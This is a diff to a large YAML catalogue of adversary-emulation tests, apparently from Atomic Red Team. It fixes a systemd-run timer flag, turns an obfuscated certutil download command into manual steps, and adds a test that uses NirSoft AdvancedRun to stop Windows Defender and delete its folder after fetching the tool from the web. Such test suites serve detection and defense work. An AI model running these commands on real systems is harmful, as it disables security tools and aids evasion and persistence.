@@ -19338,7 +19338,7 @@ privilege-escalation:
 '
       executor:
         elevation_required: false
-        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calender ''*:0/1''
+        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calendar ''*:0/1''
           /bin/sh -c ''echo "$(date) $(whoami)" >>/tmp/log''
 
 '
@@ -19368,7 +19368,7 @@ privilege-escalation:
 '
       executor:
         elevation_required: true
-        command: 'systemd-run --unit=Atomic-Red-Team --on-calender ''*:0/1'' /bin/sh
+        command: 'systemd-run --unit=Atomic-Red-Team --on-calendar ''*:0/1'' /bin/sh
           -c ''echo "$(date) $(whoami)" >>/tmp/log''
 
 '
@@ -32444,22 +32444,23 @@ defense-evasion:
       - windows
       input_arguments:
         remote_file:
-          description: URL of file to copy
+          description: URL of file to download
           type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
         local_path:
-          description: Local path to place file
+          description: Local path/filename to save the dowloaded file to
           type: Path
           default: Atomic-license.txt
       executor:
-        command: 'cmd /c certutil —ૹu૰rlࢰca࣢c෯he  –‮spli؅t‮‭ −"൏ᶠ൸" #{remote_file}
-          #{local_path}
+        steps: |
+          1. Copy the following command into the command prompt after replacing #{remote_file} and #{local_path} with your desired URL and filename.
 
-'
-        cleanup_command: 'del #{local_path} >nul 2>&1
 
-'
-        name: command_prompt
+            certutil —ૹu૰rlࢰca࣢c෯he  –‮spli؅t‮‭ −"൏ᶠ൸" #{remote_file} #{local_path}
+
+
+          2. Press enter to execute the command. You will find the file or webpage you specified saved to the file you specified in the command.
+        name: manual
   T1218.008:
     technique:
       id: attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071
@@ -35135,7 +35136,7 @@ defense-evasion:
       executor:
         command: |
           cp /bin/sh /tmp/crond;
-          /tmp/crond
+          echo 'sleep 5' | /tmp/crond
         cleanup_command: 'rm /tmp/crond
 
 '
@@ -49160,7 +49161,7 @@ persistence:
 '
       executor:
         elevation_required: false
-        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calender ''*:0/1''
+        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calendar ''*:0/1''
           /bin/sh -c ''echo "$(date) $(whoami)" >>/tmp/log''
 
 '
@@ -49190,7 +49191,7 @@ persistence:
 '
       executor:
         elevation_required: true
-        command: 'systemd-run --unit=Atomic-Red-Team --on-calender ''*:0/1'' /bin/sh
+        command: 'systemd-run --unit=Atomic-Red-Team --on-calendar ''*:0/1'' /bin/sh
           -c ''echo "$(date) $(whoami)" >>/tmp/log''
 
 '
@@ -59175,7 +59176,48 @@ resource-development:
       x_mitre_detection: Much of this activity will take place outside the visibility
         of the target organization, making detection of this behavior difficult. Detection
         efforts may be focused on post-compromise phases of the adversary lifecycle.
-    atomic_tests: []
+      identifier: T1588.002
+    atomic_tests:
+    - name: Run NirSoft AdvancedRun
+      auto_generated_guid: f7d43d35-d628-4582-bb03-01b1c5e10d11
+      description: "Information on NirSoft AdvancedRun and it's creators found here:
+        http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe
+        with similar behavior identified during the WhisperGate campaign.\nUpon successful
+        execution, AdvancedRun.exe will run and stop Defender and attempt to delete
+        the Defender folder on disk. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_folder:
+          description: Local path of AdvancedRun executable
+          type: Path
+          default: PathToAtomicsFolder\T1588.002\bin\AdvancedRun
+        local_executable:
+          description: name of the advancedrun executable
+          type: String
+          default: advancedrun.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Advancedrun.exe must be located at #{local_folder}\#{local_executable}
+
+'
+        prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -UseBasicParsing -OutFile "$env:temp\AdvancedRun.zip"
+            Expand-Archive $env:temp\AdvancedRun.zip #{local_folder} -Force
+      executor:
+        command: |
+          #{local_folder}\#{local_executable} /EXEFilename "C:\Windows\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run
+          #{local_folder}\#{local_executable} "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /WindowState 0 /CommandLine "rmdir 'C:\ProgramData\Microsoft\Windows Defender' -Recurse" /StartDirectory "" /RunAs 8 /Run
+        cleanup_command: 'Remove-Item #{local_folder}\#{local_executable} -ErrorAction
+          Ignore
+
+'
+        name: powershell
+        elevation_required: true
   T1608.001:
     technique:
       external_references:
@@ -64991,7 +65033,7 @@ execution:
 '
       executor:
         elevation_required: false
-        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calender ''*:0/1''
+        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calendar ''*:0/1''
           /bin/sh -c ''echo "$(date) $(whoami)" >>/tmp/log''
 
 '
@@ -65021,7 +65063,7 @@ execution:
 '
       executor:
         elevation_required: true
-        command: 'systemd-run --unit=Atomic-Red-Team --on-calender ''*:0/1'' /bin/sh
+        command: 'systemd-run --unit=Atomic-Red-Team --on-calendar ''*:0/1'' /bin/sh
           -c ''echo "$(date) $(whoami)" >>/tmp/log''
 
 '
@@ -71444,7 +71486,7 @@ exfiltration:
         input_file:
           description: Test file to upload
           type: Path
-          default: PathToAtomicsFolder/T1048.002/files/artifact
+          default: PathToAtomicsFolder/T1048.002/src/artifact
         curl_path:
           description: path to curl.exe
           type: Path
@@ -71480,7 +71522,7 @@ exfiltration:
         input_file:
           description: Test file to upload
           type: Path
-          default: PathToAtomicsFolder/T1048.002/files/artifact
+          default: PathToAtomicsFolder/T1048.002/src/artifact
       executor:
         name: bash
         elevation_required: false
